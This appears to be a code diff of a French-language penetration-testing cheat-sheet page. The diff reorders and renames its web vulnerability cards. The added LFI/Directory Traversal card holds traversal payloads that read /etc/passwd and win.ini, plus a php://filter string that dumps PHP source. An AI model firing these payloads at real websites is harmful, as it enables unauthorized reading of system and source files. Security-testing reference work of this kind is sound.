@@ -1,8 +1,51 @@
-<h1>Vulnérabilités Web</h1>
+<h2 style="margin: 30px 0 30px 0;">Vulnérabilités Web</h2>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Injection SQL</h2>
+        <h3>LFI/Directory Traversal</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content">
+        <p class="cmd-description">Cible : Les paramètres qui chargent des fichiers ou des pages (?page=, ?file=)</p>
+        <div class="cmd-item">
+            Test manuel :
+    
+            Linux : ../../../../etc/passwd
+            
+            Windows : ../../../../windows/win.ini
+            <div class="code-block">
+                <code>
+                    <span class="variable" data-var="url">URL</span>?file=../../../../etc/passwd
+                    <br>
+                    <span class="variable" data-var="url">URL</span>?file=../../../../windows/win.ini
+                </code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Lecture de fichiers locaux via traversal</p>
+        </div>
+        <div class="cmd-item">
+            <div class="code-block">
+                <code><span class="variable" data-var="url">URL</span>?file=php://filter/convert.base64-encode/resource=index.php</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Lecture de code source PHP en base64</p>
+        </div>
+    </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>Injection SQL</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -35,7 +78,7 @@
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>XSS (Cross-Site Scripting)</h2>
+        <h3>XSS (Cross-Site Scripting)</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -68,40 +111,7 @@
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>LFI (Local File Inclusion)</h2>
-        <span class="collapse-icon">▼</span>
-    </div>
-    <div class="card-content">
-        <div class="cmd-item">
-            <div class="code-block">
-                <code><span class="variable" data-var="url">URL</span>?file=../../../../etc/passwd</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Lecture de fichiers locaux via traversal</p>
-        </div>
-        <div class="cmd-item">
-            <div class="code-block">
-                <code><span class="variable" data-var="url">URL</span>?file=php://filter/convert.base64-encode/resource=index.php</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Lecture de code source PHP en base64</p>
-        </div>
-    </div>
-</div>
-
-<div class="card collapsible">
-    <div class="card-header">
-        <h2>Upload de fichiers</h2>
+        <h3>Upload de fichiers</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -134,7 +144,7 @@
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Command Injection</h2>
+        <h3>Command Injection</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
